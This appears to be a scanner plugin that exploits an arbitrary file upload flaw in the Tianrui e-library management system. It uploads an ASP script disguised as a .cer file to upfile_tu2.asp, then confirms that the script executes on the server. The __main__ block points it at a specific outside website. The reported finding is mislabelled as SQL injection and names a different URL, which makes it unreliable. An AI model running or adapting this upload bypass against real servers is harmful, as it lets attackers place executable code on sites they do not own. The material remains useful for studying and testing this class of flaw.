#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 天睿电子图书管理系统任意文件上传
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0121549
description:
'''

import re

def assign(service, arg):
    if service == 'tianrui_lib':
        return True, arg

def audit(arg):
    url = arg + 'upfile_tu2.asp?id=1'
    content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryriebpEo5zuOo08zY'
    data = '''------WebKitFormBoundaryriebpEo5zuOo08zY\r
Content-Disposition: form-data; name="act"\r
\r
upload\r
------WebKitFormBoundaryriebpEo5zuOo08zY\r
Content-Disposition: form-data; name="filepath"\r
\r
upimg/\r
------WebKitFormBoundaryriebpEo5zuOo08zY\r
Content-Disposition: form-data; name="file1"; filename="test.cer"\r
Content-Type: application/x-x509-ca-cert\r
\r
<%\r
    a = "WtFhhh"\r
    b = "HHHwTf"\r
    Response.Write(a+b)\r
%>\r
------WebKitFormBoundaryriebpEo5zuOo08zY\r
Content-Disposition: form-data; name="Submit"\r
\r
· 提交 ·\r
------WebKitFormBoundaryriebpEo5zuOo08zY--\r
'''
    #proxy = ('127.0.0.1', 8887)
    code, head, res, err, _ = curl.curl2(url, post=data, header=content_type)
    if code != 200:
        return False
    m = re.search(r'=>\s*(upimg/[\d-]*\.cer)\s*', res)
    if not m:
        return False
    verify = arg + m.group(1)
    code, head, res, err, _ = curl.curl2(verify)
    if(code == 200) and ("WtFhhhHHHwTf" in res):
        security_hole("SQL Injection: " + arg + 'upfile_tu1.ASP?id=1')
if __name__ == '__main__':
    from dummy import *
    audit(assign('tianrui_lib', 'http://www.gyxsqex.com/tushu/')[1])